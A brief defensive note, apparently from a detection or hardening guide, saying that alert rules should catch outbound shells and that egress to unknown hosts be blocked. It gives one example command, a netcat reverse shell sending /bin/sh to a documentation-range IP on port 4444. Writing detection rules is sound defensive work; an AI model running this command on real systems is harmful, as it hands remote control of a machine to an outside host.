Detection rules should alert on outbound shells such as:

```
nc -e /bin/sh 203.0.113.5 4444
```

Block egress to unknown hosts.
